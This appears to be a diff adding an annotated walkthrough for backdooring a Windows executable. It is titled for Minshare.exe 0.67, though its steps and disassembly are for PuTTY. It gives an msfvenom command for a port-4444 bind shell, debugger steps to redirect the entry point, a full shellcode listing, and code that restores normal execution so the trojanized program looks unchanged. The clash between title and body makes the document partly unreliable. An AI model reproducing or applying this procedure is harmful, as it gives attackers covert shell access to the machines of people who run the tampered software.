@@ -1,0 +1,184 @@
+Steps to backdoor Minshare.exe (version 0.67):
+
+1. Download Putty.exe from this link https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
+2. Open it in Immunity Debugger
+3. Replace the program entry point with the 'Program Entry Point' instruction below
+4. Jump to address 0x0047C6AF
+5. Binary paste the code below (you'll need to filter out only the opcodes)
+6. Select modifications and Copy to executable
+7. Save the new executable
+8. Run the application
+9. Connect to the shell at port 4444 (you can use msfconsole and setup a multi/handler listener)
+10. You'll get a shell to the target machine and the application runs as usual (as long as a listener is setup and ready to connect to port 4444)
+
+Shellcode command: msfvenom -p windows/shell_bind_tcp LPORT=4444 -f hex EXITFUNC=none
+
+
+004550F0 > $-E9 BA750200    JMP putty_12.0047C6AF                 -> Program entry point
+
+004550F5   . E8 0A210000    CALL putty_11.00457204                -> Address to return to
+
+0047C6AF   60               PUSHAD                            -> Saving registers to stack
+0047C6B0   9C               PUSHFD                            -> Saving flags to stack
+0047C6B1   90               NOP
+0047C6B2   90               NOP
+0047C6B3   90               NOP
+0047C6B4   90               NOP
+0047C6B5   90               NOP
+0047C6B6   90               NOP
+0047C6B7   90               NOP
+0047C6B8   90               NOP
+0047C6B9   FC               CLD                               -> TCP bind shellcode. Binds a shell at port 4444
+0047C6BA   E8 82000000      CALL putty_12.0047C741
+0047C6BF   60               PUSHAD
+0047C6C0   89E5             MOV EBP,ESP
+0047C6C2   31C0             XOR EAX,EAX
+0047C6C4   64:8B50 30       MOV EDX,DWORD PTR FS:[EAX+30]
+0047C6C8   8B52 0C          MOV EDX,DWORD PTR DS:[EDX+C]
+0047C6CB   8B52 14          MOV EDX,DWORD PTR DS:[EDX+14]
+0047C6CE   8B72 28          MOV ESI,DWORD PTR DS:[EDX+28]
+0047C6D1   0FB74A 26        MOVZX ECX,WORD PTR DS:[EDX+26]
+0047C6D5   31FF             XOR EDI,EDI
+0047C6D7   AC               LODS BYTE PTR DS:[ESI]
+0047C6D8   3C 61            CMP AL,61
+0047C6DA   7C 02            JL SHORT putty_12.0047C6DE
+0047C6DC   2C 20            SUB AL,20
+0047C6DE   C1CF 0D          ROR EDI,0D
+0047C6E1   01C7             ADD EDI,EAX
+0047C6E3  ^E2 F2            LOOPD SHORT putty_12.0047C6D7
+0047C6E5   52               PUSH EDX
+0047C6E6   57               PUSH EDI
+0047C6E7   8B52 10          MOV EDX,DWORD PTR DS:[EDX+10]
+0047C6EA   8B4A 3C          MOV ECX,DWORD PTR DS:[EDX+3C]
+0047C6ED   8B4C11 78        MOV ECX,DWORD PTR DS:[ECX+EDX+78]
+0047C6F1   E3 48            JECXZ SHORT putty_12.0047C73B
+0047C6F3   01D1             ADD ECX,EDX
+0047C6F5   51               PUSH ECX
+0047C6F6   8B59 20          MOV EBX,DWORD PTR DS:[ECX+20]
+0047C6F9   01D3             ADD EBX,EDX
+0047C6FB   8B49 18          MOV ECX,DWORD PTR DS:[ECX+18]
+0047C6FE   E3 3A            JECXZ SHORT putty_12.0047C73A
+0047C700   49               DEC ECX
+0047C701   8B348B           MOV ESI,DWORD PTR DS:[EBX+ECX*4]
+0047C704   01D6             ADD ESI,EDX
+0047C706   31FF             XOR EDI,EDI
+0047C708   AC               LODS BYTE PTR DS:[ESI]
+0047C709   C1CF 0D          ROR EDI,0D
+0047C70C   01C7             ADD EDI,EAX
+0047C70E   38E0             CMP AL,AH
+0047C710  ^75 F6            JNZ SHORT putty_12.0047C708
+0047C712   037D F8          ADD EDI,DWORD PTR SS:[EBP-8]
+0047C715   3B7D 24          CMP EDI,DWORD PTR SS:[EBP+24]
+0047C718  ^75 E4            JNZ SHORT putty_12.0047C6FE
+0047C71A   58               POP EAX
+0047C71B   8B58 24          MOV EBX,DWORD PTR DS:[EAX+24]
+0047C71E   01D3             ADD EBX,EDX
+0047C720   66:8B0C4B        MOV CX,WORD PTR DS:[EBX+ECX*2]
+0047C724   8B58 1C          MOV EBX,DWORD PTR DS:[EAX+1C]
+0047C727   01D3             ADD EBX,EDX
+0047C729   8B048B           MOV EAX,DWORD PTR DS:[EBX+ECX*4]
+0047C72C   01D0             ADD EAX,EDX
+0047C72E   894424 24        MOV DWORD PTR SS:[ESP+24],EAX
+0047C732   5B               POP EBX
+0047C733   5B               POP EBX
+0047C734   61               POPAD
+0047C735   59               POP ECX
+0047C736   5A               POP EDX
+0047C737   51               PUSH ECX
+0047C738   FFE0             JMP EAX
+0047C73A   5F               POP EDI
+0047C73B   5F               POP EDI
+0047C73C   5A               POP EDX
+0047C73D   8B12             MOV EDX,DWORD PTR DS:[EDX]
+0047C73F  ^EB 8D            JMP SHORT putty_12.0047C6CE
+0047C741   5D               POP EBP
+0047C742   68 33320000      PUSH 3233
+0047C747   68 7773325F      PUSH 5F327377
+0047C74C   54               PUSH ESP
+0047C74D   68 4C772607      PUSH 726774C
+0047C752   FFD5             CALL EBP
+0047C754   B8 90010000      MOV EAX,190
+0047C759   29C4             SUB ESP,EAX
+0047C75B   54               PUSH ESP
+0047C75C   50               PUSH EAX
+0047C75D   68 29806B00      PUSH 6B8029
+0047C762   FFD5             CALL EBP
+0047C764   6A 08            PUSH 8
+0047C766   59               POP ECX
+0047C767   50               PUSH EAX
+0047C768  ^E2 FD            LOOPD SHORT putty_12.0047C767
+0047C76A   40               INC EAX
+0047C76B   50               PUSH EAX
+0047C76C   40               INC EAX
+0047C76D   50               PUSH EAX
+0047C76E   68 EA0FDFE0      PUSH E0DF0FEA
+0047C773   FFD5             CALL EBP
+0047C775   97               XCHG EAX,EDI
+0047C776   68 0200115C      PUSH 5C110002
+0047C77B   89E6             MOV ESI,ESP
+0047C77D   6A 10            PUSH 10
+0047C77F   56               PUSH ESI
+0047C780   57               PUSH EDI
+0047C781   68 C2DB3767      PUSH 6737DBC2
+0047C786   FFD5             CALL EBP
+0047C788   57               PUSH EDI
+0047C789   68 B7E938FF      PUSH FF38E9B7
+0047C78E   FFD5             CALL EBP
+0047C790   57               PUSH EDI
+0047C791   68 74EC3BE1      PUSH E13BEC74
+0047C796   FFD5             CALL EBP
+0047C798   57               PUSH EDI
+0047C799   97               XCHG EAX,EDI
+0047C79A   68 756E4D61      PUSH 614D6E75
+0047C79F   FFD5             CALL EBP
+0047C7A1   68 636D6400      PUSH 646D63
+0047C7A6   89E3             MOV EBX,ESP
+0047C7A8   57               PUSH EDI
+0047C7A9   57               PUSH EDI
+0047C7AA   57               PUSH EDI
+0047C7AB   31F6             XOR ESI,ESI
+0047C7AD   6A 12            PUSH 12
+0047C7AF   59               POP ECX
+0047C7B0   56               PUSH ESI
+0047C7B1  ^E2 FD            LOOPD SHORT putty_12.0047C7B0
+0047C7B3   66:C74424 3C 010>MOV WORD PTR SS:[ESP+3C],101
+0047C7BA   8D4424 10        LEA EAX,DWORD PTR SS:[ESP+10]
+0047C7BE   C600 44          MOV BYTE PTR DS:[EAX],44
+0047C7C1   54               PUSH ESP
+0047C7C2   50               PUSH EAX
+0047C7C3   56               PUSH ESI
+0047C7C4   56               PUSH ESI
+0047C7C5   56               PUSH ESI
+0047C7C6   46               INC ESI
+0047C7C7   56               PUSH ESI
+0047C7C8   4E               DEC ESI
+0047C7C9   56               PUSH ESI
+0047C7CA   56               PUSH ESI
+0047C7CB   53               PUSH EBX
+0047C7CC   56               PUSH ESI
+0047C7CD   68 79CC3F86      PUSH 863FCC79
+0047C7D2   FFD5             CALL EBP
+0047C7D4   89E0             MOV EAX,ESP
+0047C7D6   90               NOP
+0047C7D7   56               PUSH ESI
+0047C7D8   46               INC ESI
+0047C7D9   FF30             PUSH DWORD PTR DS:[EAX]
+0047C7DB   68 08871D60      PUSH 601D8708
+0047C7E0   FFD5             CALL EBP
+0047C7E2   BB AAC5E25D      MOV EBX,5DE2C5AA
+0047C7E7   68 A695BD9D      PUSH 9DBD95A6
+0047C7EC   FFD5             CALL EBP
+0047C7EE   3C 06            CMP AL,6
+0047C7F0   7C 0A            JL SHORT putty_12.0047C7FC
+0047C7F2   80FB E0          CMP BL,0E0
+0047C7F5   75 05            JNZ SHORT putty_12.0047C7FC
+0047C7F7   BB 4713726F      MOV EBX,6F721347
+0047C7FC   6A 00            PUSH 0
+0047C7FE   53               PUSH EBX
+0047C7FF   81C4 00020000    ADD ESP,200                   -> Realigning stack to 0012FFA0
+0047C805   9D               POPFD                         -> Restoring flags
+0047C806   61               POPAD                         -> Restoring Registers
+0047C807   6A 60            PUSH 60                       -> Executing instructions overwritten by JMP at program entry point
+0047C809   68 08814700      PUSH putty_12.00478108
+0047C80E  -E9 E288FDFF      JMP putty_12.004550F5         -> Restoring the application execution flow
+
